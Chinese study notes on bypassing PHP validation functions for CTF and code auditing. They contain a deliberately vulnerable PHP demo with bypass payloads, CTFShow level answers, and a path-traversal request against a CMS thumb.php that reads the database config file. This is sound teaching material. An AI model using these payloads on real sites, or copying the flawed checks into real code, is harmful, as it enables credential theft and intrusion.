# 知识点：

1、过滤函数缺陷绕过

2、CTF 考点与代码审计

# 原理

1、==与===

"==”弱类型比较，会比较数值，不会比较类型，判断不能成为唯一性。

在数字和字符串进行对比的情况时，当字符串为无法转换为数字，则会被强制转化为数字，结果总会为0 

“===”强类型比较，会同时对比数值和类型，具有唯一性。

补充：[PHP 浅谈 == 和=== 中，数字和字符串比较的问题。_php 数字==字符串-CSDN博客](https://blog.csdn.net/Auuuuuuuu/article/details/79621635?ops_request_misc=%7B%22request%5Fid%22%3A%22170558382816800182794977%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170558382816800182794977&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-79621635-null-null.142^v99^pc_search_result_base8&utm_term=PHP%3D%3D&spm=1018.2226.3001.4449)

2、md5

###### 结合“==”使用时的缺陷

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720106549851-3a21d98f-b637-4ce6-a81f-b4caa2f34914.png)

代码逻辑：当name和password输入的值不同时，进入第二个条件：name的md5加密后的数==比较passwordmd5加密后的数，如果相等，则输出flag



输入name=QNKCDZO和password=240610708

解析

QNKCDZO以MD5加密：0e830400451993494058024219903391

240610708以MD5加密：0e462097431906509019562988736854

又已知是用”==”进行的比较，所以就绕过了

###### 使用===的解析

===唯一性比较，所以我们使用数组的方式

name[]=1&password[]=2

代码会收到两个null，故判断正确。输出flag

在PHP中，md5不能处理数组，遇到数组会返回null。PHP中字符串经过md5处理后，以0e开头且后面是数字，并且PHP会将哈希解释为科学计数法表示为０的多少次幂，0e表示为0*10的幂次方，则等于0.

3、intval

进制转换（类型转化），intval缺陷绕过，获取数值的整数型（默认十进制）

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720106747229-95bbccda-0810-4378-9e6e-e2341b956d3c.png)

如果base为0，则通过字符串的格式进行检测

输入的字符串如以0开头，则会被转换为八进制；

如以0x开头，则以十六进制转换；

4、strpos：strpos(string,find,start)

对于strpos可以利用换行进行绕过（%0a）

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720106977928-bc220a20-1918-4c7e-98a1-cbb4379f02e1.png)

string是被检查的字符串，find是要被搜索的字符串，start是开始检索的位置，从0开始查找字符串第一次出现的位置，区分大小写。

可以通过换行进行绕过：%0a666

%0a:表示换行

也可以在有必要的条件下使用 数组 返回null

5、in_array

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720107017244-4e508364-53a8-4533-883d-5c4b10cdff78.png)

搜索数组中的特定值：第三个参数，可选，如果设为True，则函数检查搜索的数据与数组的值的类型是否相同（类似===）

6、preg_match

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720107050502-dca814cf-1593-46a5-8e25-6daec2d6402e.png)

正则表达式：执行匹配数据，第一个参数：只能匹配字符串

代码逻辑：获取到一个num值，匹配num值中是否有0-9的字符，有就die并输出nonono，反之出来，进入下一个条件：num为整数即可

缺陷：有函数性质可得，第一个参数只接受字符串，所以输入一个数组即可

7、str_replace：Sql过滤

将第一参数，转换为第二参数值；无法迭代循环。即只能一次性过滤

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720107114746-f2cc3967-3fe8-4ebb-89bd-4dbc25ba0e86.png)

缺陷：

大小写和双写

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1720107153414-890c2eec-6d87-421b-b782-e9673b595bb4.png)

### 补充学习：

[GitHub - hongriSec/PHP-Audit-Labs: 一个关于PHP的代码审计项目](https://github.com/hongriSec/PHP-Audit-Labs)

[PHP-Audit-Labs/Part1/Day1/files/README.md at master · hongriSec/PHP-Audit-Labs](https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md)





```plain
#知识点：
1、过滤函数缺陷绕过
2、CTF考点与代码审计

#详细点：最常见函数使用
==与===
md5
intval
strpos
in_array
preg_match
str_replace




<?php
header("Content-Type:text/html;charset=utf-8");
$flag='xiaodi ai chi xigua!';

//1、== ===缺陷绕过 == 弱类型对比 ===还会比较类型
$a=1;
if($a==$_GET['x']){
 echo $flag;
}

//1.0 +1 1a

$a='1';
if($a===$_GET['y']){
 echo $flag;
}

//1.0 +1等


//2、MD5函数缺陷绕过 ==弱对比 ===强类型对比
if($_GET['name'] != $_GET['password']){
 if(MD5($_GET['name']) == MD5($_GET['password'])){
 echo $flag;
 }
 echo '?';
}
//==
//echo MD5('QNKCDZO');
//echo MD5('240610708');

//===
//name[]=1&password[]=2

//3、intval缺陷绕过
$i='666';
$ii=$_GET['n'];
if(intval($ii==$i)){
 echo $flag;
}

// 666.0 +666

$i='666';
$ii=$_GET['n'];
if(intval($ii==$i,0)){
 echo $flag;
}

//0x29a

//4、对于strpos()函数，我们可以利用换行进行绕过（%0a）
$i='666';
$ii=$_GET['h'];
if(strpos($ii==$i,"0")){
 echo $flag;
}


//?num=%0a666



//5、in_array第三个参数安全
$whitelist = [1,2,3];
$page=$_GET['i'];
if (in_array($page, $whitelist)) {
 echo "yes";
}

//?i=1ex

//6、preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错
if(isset($_GET['num'])){
 $num = $_GET['num'];
 if(preg_match("/[0-9]/", $num)){
 die("no no no!");
 }
 if(intval($num)){
 echo $flag;
 }
}


//?num[]=1

//7、str_replace无法迭代过滤
$sql=$_GET['s'];
$sql=str_replace('select','',$sql);
echo $sql;

//?s=sselectelect

?>
```

- 原理-缺陷函数-使用讲解-本地

```plain
原理-缺陷函数-使用讲解-本地
1、== ===缺陷绕过 == 弱类型对比，不会对比类型 ===还会比较类型
$a=1;
if($a==$_GET['x']){
 echo $flag;
}
//1.0 +1 1a
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114721966-843eb41e-ac8a-4d31-9738-122788b9607b.png)

```plain
$a='1';
if($a===$_GET['y']){
 echo $flag;
}
这个判断就可以确定唯一性，不能更改。
2、MD5函数缺陷绕过 ==弱对比 ===强类型对比
if($_GET['name'] != $_GET['password']){
 if(MD5($_GET['name']) == MD5($_GET['password'])){
 echo $flag;
 }
 echo '?';
}
0e开头的md5值：https://www.cnblogs.com/Oran9e/p/6537204.html
//==
//echo MD5('QNKCDZO');  
0e830400451993494058024219903391
//echo MD5('240610708');
0e462097431906509019562988736854
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114721965-bcaf1450-d4f9-422f-a52a-980a4ab144aa.png)

```plain
if($_GET['name'] != $_GET['password']){
 if(MD5($_GET['name']) === MD5($_GET['password'])){
 echo $flag;
 }
 echo '?';
}
Md5不能判断数组，判断为null
//===
//name[]=1&password[]=2
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114722009-212bddd2-42b5-4ccc-8cc1-8b4972d6e7bf.png)

```plain
3、intval缺陷绕过
Intval 使用：https://www.runoob.com/php/php-intval-function.html
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114721968-747a7c52-adde-4280-a822-e38c63ec77d3.png)

```plain
$i='666';
$ii=$_GET['n'];
if(intval($ii==$i)){
 echo $flag;
}
// 666.0 +666
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114722525-1aa7afe6-b528-419b-a39c-ee5dc11e9271.png)

```plain
$i='666';
$ii=$_GET['n1'];
if(intval($ii==$i,0)){
 echo $flag;
}
如果字符串以 "0" 开始，使用 8 进制(octal)；

//0x29a
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114722806-1d4739d7-82b8-409a-8109-3f1c69bd4b63.png)

```plain
4、对于strpos()函数，我们可以利用换行进行绕过（%0a）
$i='666';
$ii=$_GET['h'];
if(strpos($i,$ii,"0")){
    echo $flag;
}

//?num=%0a666
好像不太行。
5、in_array第三个参数安全
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114722712-e612d55e-ba70-4b43-a899-01045e90f831.png)

```plain
$whitelist = [1,2,3];
$page=$_GET['i'];
if (in_array($page, $whitelist)) {
 echo "yes";
}
没有TRUE相当于==，设置了TRUE相当于===
//?i=1ex

6、preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错
preg_match匹配不了数组。
if(isset($_GET['num'])){
 $num = $_GET['num'];
 if(preg_match("/[0-9]/", $num)){
 die("no no no!");
 }
 if(intval($num)){
 echo $flag;
 }
}
//?num[]=1

7、str_replace无法迭代过滤
$sql=$_GET['s'];
$sql=str_replace('select','',$sql);
echo $sql;

//?s=sselectelect
```

- 实践-CTFShow-PHP特性-89关卡

```plain
89关：?num[]=1
90关：?num=4476.0
91关：?cmd=%0aphp
92关：?num=010574
93关：?num=010574
94关：?num= 010574
95关：?u=./flag.php
```

- 实践-代码审计-过滤缺陷-文件读取

全局搜索str_replace函数，发现：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114722795-684ac459-6c30-45e1-acbb-20d8681cb9fe.png)

控制dir，可以任意读取文件。/include/thumb.php?dir=.....///http\.....//\config/config_db.php

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721114722978-208e9d5d-302d-4521-b8bd-a18e131113a0.png)